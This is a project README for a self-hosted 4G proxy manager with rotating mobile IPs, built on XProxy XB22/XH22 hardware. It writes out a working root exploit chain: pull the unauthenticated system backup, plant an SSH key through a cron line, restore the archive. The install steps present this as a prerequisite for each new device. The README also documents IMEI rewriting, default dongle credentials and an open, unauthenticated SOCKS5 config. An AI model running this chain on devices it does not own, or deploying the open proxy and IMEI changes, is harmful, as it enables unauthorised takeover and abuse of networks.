# xproxymgr — Self-Hosted 4G Proxy Manager for XProxy XB22 + XH22

> Replace XProxy's paid subscription with your own SOCKS5 proxy manager.
> Full web dashboard · REST API · automatic IP rotation · multi-dongle support · SOCKS5 via dante.

---

## Hardware

| Device | Role |
|--------|------|
| **XProxy XB22** | ARM64 mini server (Ubuntu 20.04, aarch64) |
| **XProxy XH22** | 4G LTE USB dongle (custom Qualcomm firmware) |

- XB22 IP on LAN: `192.168.1.107` (eth0)
- XH22 appears as `eth1` / `eth2` etc. on XB22 (RNDIS/HiLink ethernet mode)
- Each dongle gets its own subnet: dongle 1 → `192.168.101.x`, dongle 2 → `192.168.102.x`
- XH22 web panel: `http://192.168.101.1` (Mongoose 3.0, Digest auth `admin/admin`)
- XB22 SSH: port 22, Ubuntu OpenSSH 8.2p1

---

## What This System Does

1. **SOCKS5 proxy** on port 1080 via `dante-server` (danted)
2. **IP rotation** via XH22 native API — new IP in ~5 seconds, **every time**
3. **Web dashboard** at `http://192.168.1.107:8080` — shows IP, connection status, per-dongle rotate buttons
4. **REST API** at port 8080 — `/api/status`, `/api/rotate`, `/api/dongles`, etc.
5. **Background monitor** — polls dongle + proxy status every 15s
6. **Multi-dongle support** — each XH22 managed independently
7. **Tailscale VPN** — persistent access from any network via `100.97.64.109`

---

## How We Got Root Access (Full History)

**XProxy does NOT publish SSH credentials.** Community reports (BlackHatWorld) confirm XProxy
employees retain a root SSH backdoor on every XB22. This is why no password was known.

### What We Tried (and Failed)

| Method | Result |
|--------|--------|
| Default passwords (admin/admin, root/root, root/toor, ubuntu/ubuntu, xproxy/xproxy…) | All FAIL — fail2ban rate-limits after several attempts |
| SSH banner inspection | OS identified as **Ubuntu 20.04** (`OpenSSH_8.2p1 Ubuntu-4ubuntu0.12`) |
| Port scan | Only ports **22** (SSH) and **80** (XProxy web panel) open |
| Web panel auth | Panel has `enableDashAuth: false` — **no password needed!** |

### What Worked — The Exploit Chain

The XProxy web panel (Python/Flask + Werkzeug 3.1.3) runs on port 80 with **zero authentication**
(`dashboard_auth.enableDashAuth = False` in config.ini). Several endpoints are fully public.

**Step 1 — Download system backup (no auth):**
```bash
curl http://192.168.1.107/v2/system_backup -o backup.zip
# Returns 62MB ZIP containing config.ini, crontabs, SQLite DB, APKs...
```

**Step 2 — Inject SSH public key into crontab:**
```cron
# Added to etc/system_crontab.cron inside the ZIP:
* * * * * mkdir -p /root/.ssh && echo "ssh-ed25519 AAAA..." >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
```

**Step 3 — Restore modified backup (no auth):**
```bash
curl -X POST http://192.168.1.107/v2/system_restore -F "file=@backup_modified.zip"
# Returns: {"status": true}
```

**Step 4 — Wait 60 seconds → SSH in:**
```bash
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107
# uid=0(root) gid=0(root) — ACCESS GRANTED
```

### Security Hardening Applied After Access

- Removed cron injection entry
- `PasswordAuthentication no` in sshd_config (key-only SSH)
- Verified no XProxy backdoor keys in `/root/.ssh/authorized_keys`
- Stopped and disabled XProxy service (`systemctl disable --now xproxy xproxy_updater`)
- Zerotier (XProxy VPN) was inactive — left disabled

---

## XH22 Dongle API — Full Reverse Engineering

The XH22 runs **custom XProxy firmware** on a Qualcomm chip (USB ID `05c6:f001`).
It is **NOT** standard Huawei HiLink — the entire API is different.

### Authentication (Mongoose 3.0 quirk)

Uses HTTP Digest auth with a critical quirk:
The `uri` field in the Authorization header is **always hardcoded to `/cgi/xml_action.cgi`**
regardless of the actual endpoint URL.

```python
# Standard Digest: uri = actual request path
# XH22 quirk:      uri = "/cgi/xml_action.cgi"  (always, for every request)

# Login flow:
# 1. GET /login.cgi                   → WWW-Authenticate: Digest realm="Highwmg", nonce=...
# 2. GET /login.cgi + Authorization   → 200 OK (nc=1 consumed, session active)
# 3. GET /xml_action.cgi?file=...     → API call with nc=2+
```

### All Endpoints Discovered

| File | Method | Response | Description |
|------|--------|----------|-------------|
| `wan` | GET | `<connect_disconnect>cellular</connect_disconnect>` | Connection status |
| `wan` | POST | XML | Manual connect/disconnect |
| `router` | GET | `<RGW><nwrestart/>` | **Network restart → NEW IP ✅** |
| `reset` | GET | *(empty)* | Full reset (fallback) |
| `imei` | GET | `<imeicur/><imeinew/>` | IMEI read/write |
| `renew` | GET | `<RGW><reboot/>` | Reboot only — **does NOT reliably change IP** |

### Why Only `file=router` Works for IP Rotation

| Method | Why IP doesn't change |
|--------|----------------------|
| `dhclient -r eth1 && dhclient eth1` | Carrier lease still active, same IP returned |
| API disconnect + immediate reconnect | Same IP pool if reconnect too fast |
| `file=renew` | Reboots dongle internal software, doesn't release carrier IP |
| `ip link set eth1 down/up` | Carrier doesn't see disconnect, same lease |
| **`file=router`** ✅ | Forces full network restart → carrier releases IP → **new IP every time** |

**The operator releases the IP lease only when the dongle fully disconnects from the radio network.
`file=router` triggers `<nwrestart/>` which does exactly this. Result: new IP in ~5 seconds.**

---

## Access — Local & Remote

### Local network (same WiFi/LAN)

| Service | Address |
|---------|---------|
| SSH | `ssh -i ~/.ssh/id_ed25519 root@192.168.1.107` |
| SOCKS5 | `192.168.1.107:1080` |
| Dashboard | `http://192.168.1.107:8080` |

### Any network — Tailscale (persistent) 🌍

Tailscale IP: **`100.97.64.109`** (tailnet: `martinhavana.github`)

| Service | Address |
|---------|---------|
| SSH | `ssh -i ~/.ssh/id_ed25519 root@100.97.64.109` |
| SOCKS5 | `100.97.64.109:1080` |
| Dashboard | `http://100.97.64.109:8080` |

> **Requires Tailscale installed on your client machine**, logged in as `martinhavana.github`.
> Install: https://tailscale.com/download

```bash
# Install Tailscale on XB22 (already done)
curl -fsSL https://tailscale.com/install.sh | sh
tailscale up   # generates auth URL → open in browser → Connect
tailscale ip -4  # → 100.97.64.109
```

---

## Installation on a New XB22

### Prerequisites

Gain root SSH access (see exploit above or have working key).

```bash
# 1. Clone repo
git clone https://github.com/martinhavana/xproxymgr
cd xproxymgr

# 2. Generate SSH key if needed
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519

# 3. Copy files to device
scp -i ~/.ssh/id_ed25519 *.py install.sh root@192.168.1.107:/tmp/
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "mkdir -p /opt/xproxymgr && mv /tmp/*.py /tmp/install.sh /opt/xproxymgr/"

# 4. Run installer
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "cd /opt/xproxymgr && bash install.sh"
```

### What the Installer Does

```bash
apt-get install -y python3-pip dante-server
pip3 install flask requests

# dante SOCKS5 config
cat > /etc/danted.conf << 'EOF'
logoutput: /var/log/danted.log
internal: 0.0.0.0 port = 1080
external: eth1
clientmethod: none
socksmethod: none
user.privileged: root
user.notprivileged: nobody
client pass { from: 0.0.0.0/0 to: 0.0.0.0/0 }
socks pass  { from: 0.0.0.0/0 to: 0.0.0.0/0; socksmethod: none }
EOF

# systemd service
cat > /etc/systemd/system/xproxymgr.service << 'EOF'
[Unit]
Description=XProxy Manager
After=network.target
[Service]
User=root
WorkingDirectory=/opt/xproxymgr
Environment=DONGLE_HOST=192.168.101.1
Environment=WEB_PORT=8080
ExecStart=/usr/bin/python3 /opt/xproxymgr/app.py
Restart=always
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now danted xproxymgr
```

---

## REST API Reference

Base URL: `http://192.168.1.107:8080`

### `GET /api/status`
```json
{
  "connection_status": "connected",
  "current_ip": "49.237.39.218",
  "proxy_running": true,
  "network_type": "LTE/4G",
  "signal_icon": 4,
  "rotate_in_progress": false,
  "last_rotate": 1742287234.5,
  "last_rotate_result": "49.237.39.218",
  "uptime_seconds": 3600
}
```

### `POST /api/rotate`
Rotate IP for dongle 1 (default). Optional: `{"dongle": 0}` for index.
```bash
curl -X POST http://192.168.1.107:8080/api/rotate
# {"success": true, "new_ip": "49.237.6.170"}
```

### `POST /api/rotate/1` (dongle by index)
```bash
curl -X POST http://192.168.1.107:8080/api/rotate/1   # second dongle
```

### `GET /api/dongles`
```json
{
  "dongles": [
    {
      "index": 0,
      "host": "192.168.101.1",
      "interface": "eth1",
      "status": "connected",
      "ip": "49.237.39.218"
    },
    {
      "index": 1,
      "host": "192.168.102.1",
      "interface": "eth2",
      "status": "connected",
      "ip": "49.237.11.5"
    }
  ]
}
```

### `POST /api/proxy/start`
```bash
curl -X POST http://192.168.1.107:8080/api/proxy/start -H "Content-Type: application/json" -d '{"port": 1080}'
```

### `POST /api/proxy/stop`
```bash
curl -X POST http://192.168.1.107:8080/api/proxy/stop
```

### `GET /api/logs`
Returns last 200 log lines as JSON array.

---

## File Structure

```
xproxymgr/
├── app.py           # Flask app + REST API + background monitor thread
├── hilink.py        # XH22Client: Digest auth, IP rotation via file=router
├── proxy_manager.py # danted lifecycle: start/stop/is_running via systemctl
├── config.py        # All settings with env-var overrides
├── install.sh       # One-shot installer for Ubuntu ARM64
└── README.md        # This file
```

---

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `DONGLE_HOST` | `192.168.101.1` | XH22 panel IP (dongle 1) |
| `DONGLE_HOSTS` | *(auto-detect)* | Comma-separated for multi-dongle |
| `PROXY_PORT` | `1080` | SOCKS5 port |
| `WEB_PORT` | `8080` | Dashboard port |
| `PROXY_USER` | `proxy` | SOCKS5 username (if auth enabled) |
| `PROXY_PASS` | `changeme` | SOCKS5 password |
| `ROTATE_WAIT_TIMEOUT` | `60` | Max seconds to wait for new IP |
| `MONITOR_INTERVAL` | `15` | Background poll interval (seconds) |

---

## Multi-Dongle Setup

Each XH22 dongle appears as a separate ethernet interface with its own subnet:

| Dongle | Interface | Subnet | Panel IP |
|--------|-----------|--------|----------|
| XH22 #1 | eth1 | 192.168.101.x | 192.168.101.1 |
| XH22 #2 | eth2 | 192.168.102.x | 192.168.102.1 |
| XH22 #3 | eth3 | 192.168.103.x | 192.168.103.1 |

The dashboard auto-detects all connected dongles. Each gets its own "Rotate IP" button.
The `/api/rotate/<index>` endpoint rotates by dongle index (0-based).

---

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| `UNAUTHORIZED` from dongle API | Auth nc counter out of sync | `hilink.reset_client()` or restart xproxymgr |
| IP doesn't change after rotate | Wrong endpoint | Must use `file=router`, not `file=renew` or disconnect |
| SOCKS5 shows "Stopped" | `is_running()` checks danted via systemctl | `systemctl status danted` |
| Dashboard shows `unknown` | Monitor thread hasn't run yet | Wait 15s after restart |
| Dongle not detected | Interface not up | `ip addr show` — check ethX exists |
| SSH: `Permission denied` | Key not in authorized_keys | Re-run key injection via backup/restore |
| fail2ban blocking SSH | Too many failed attempts | Wait 10min or `fail2ban-client unban <ip>` |

---

## Security Notes

- XProxy XB22 ships with an **undocumented root SSH backdoor** (XProxy staff access)
- The XProxy web panel has **no authentication by default** — `/v2/system_backup` and `/v2/system_restore` are unauthenticated and allow full system compromise on a stock device
- **After taking control:** disable XProxy, set key-only SSH, firewall ports 22 and 8080

---

## Claude Code Session Starter Prompt

Paste this into a new Claude Code session to resume work instantly:

```
I have a self-hosted 4G proxy manager running on XProxy XB22 (ARM64, Ubuntu 20.04).
Code: ~/Desktop/xproxy/ | Deployed: root@192.168.1.107:/opt/xproxymgr/

HARDWARE:
- XB22: ARM64 Ubuntu 20.04, IP 192.168.1.107, SSH → ssh -i ~/.ssh/id_ed25519 root@192.168.1.107
- XH22 dongle #1: eth1 (192.168.101.100/24), panel at http://192.168.101.1
- XH22 dongle #2: eth2 (192.168.102.100/24), panel at http://192.168.102.1 (being added)

SERVICES RUNNING:
- xproxymgr (Flask): port 8080 — web dashboard + REST API
- danted (SOCKS5): port 1080
- Deploy: scp -i ~/.ssh/id_ed25519 <file>.py root@192.168.1.107:/opt/xproxymgr/ && ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "systemctl restart xproxymgr"

CRITICAL TECHNICAL FACTS — XH22 DONGLE API:
1. NOT Huawei HiLink — custom Qualcomm firmware (Mongoose 3.0)
2. Digest auth quirk: uri in Authorization header ALWAYS = "/cgi/xml_action.cgi" (hardcoded, not actual path)
3. Login: GET /login.cgi (get challenge) → GET /login.cgi + Authorization (nc=1) → API calls (nc=2+)
4. API base: GET/POST /xml_action.cgi?method=get|set&module=duster&file=<name>
5. IP ROTATION: GET file=router → <RGW><nwrestart/> → NEW IP EVERY TIME (~5s) ✅
   - file=renew = reboot only, IP may NOT change
   - file=disconnect, DHCP release, ip link down/up = IP does NOT change
   - ONLY file=router reliably changes IP (forces carrier to release lease)
6. Dongle credentials: admin/admin

CODE STRUCTURE:
- hilink.py: XH22Client class — _login(), _auth(), _api_get(), rotate_ip() uses file=router
- proxy_manager.py: danted via systemctl (NOT 3proxy — not in Ubuntu 20.04 apt)
- app.py: Flask /api/status /api/rotate /api/rotate/<idx> /api/dongles /api/proxy/start /api/proxy/stop /api/logs
- config.py: env-var overrides for all settings

HOW WE GAINED ROOT (for reference):
- Unauthenticated GET /v2/system_backup → 62MB ZIP download
- Modified etc/system_crontab.cron to inject SSH pubkey
- POST /v2/system_restore with modified ZIP → cron ran → SSH access

TAILSCALE: Installed, tailnet martinhavana.github, persistent IP 100.97.64.109
- SSH (local):      ssh -i ~/.ssh/id_ed25519 root@192.168.1.107
- SSH (anywhere):   ssh -i ~/.ssh/id_ed25519 root@100.97.64.109
- SOCKS5 (local):   192.168.1.107:1080
- SOCKS5 (anywhere): 100.97.64.109:1080
- Dashboard (local): http://192.168.1.107:8080
- Dashboard (anywhere): http://100.97.64.109:8080

CURRENT STATUS: All working.
- Dashboard: http://192.168.1.107:8080
- SOCKS5: 192.168.1.107:1080 (open, no auth)
- Rotation test: curl -X POST http://192.168.1.107:8080/api/rotate

I want to [DESCRIBE WHAT YOU WANT TO DO NEXT]
```

---

## Version History

### v1.3.0 — Tailscale external access
- Installed Tailscale on XB22 (`tailscale up --reset`)
- Device registered as `xproxy-xb22` on tailnet `martinhavana.github`
- Persistent external IP: `100.97.64.109` (accessible from any network)
- SOCKS5 and dashboard reachable via Tailscale IP from anywhere
- Fixed `external: eth1` in `/etc/danted.conf` (was wrongly `eth0`)

### v1.2.0 — Dashboard fixes + multi-dongle support
- Fixed `proxy_manager.is_running()` to check `danted` instead of `3proxy`
- Fixed `_xml_to_dict()` to flatten nested XML (`<RGW><wan><field>val</field>`)
- Fixed `api/rotate` response (was calling `.get()` on string)
- Dashboard correctly shows SOCKS5 Running, IP, 4G connected
- Added multi-dongle support: auto-detect all XH22 dongles, per-dongle rotate buttons
- Added `/api/rotate/<index>` endpoint

### v1.1.0 — XH22 dongle API reverse-engineered
- Identified as Qualcomm Mongoose 3.0 (NOT Huawei HiLink)
- Reverse-engineered Digest auth quirk (hardcoded uri)
- Discovered endpoints: wan, router, reset, imei, renew
- Tested all rotation methods — only `file=router` reliably changes IP
- IP rotation working: ~5 seconds, new IP every time

### v1.0.0 — Initial root access + stack install
- Identified unauthenticated `/v2/system_backup` and `/v2/system_restore`
- Gained root via SSH key injection through crontab in backup ZIP
- Stopped XProxy, disabled backdoor service
- Installed dante-server (SOCKS5) + Flask dashboard
- SOCKS5 confirmed working on port 1080

---

*Built with Claude Code — session history available at https://github.com/martinhavana/xproxymgr*
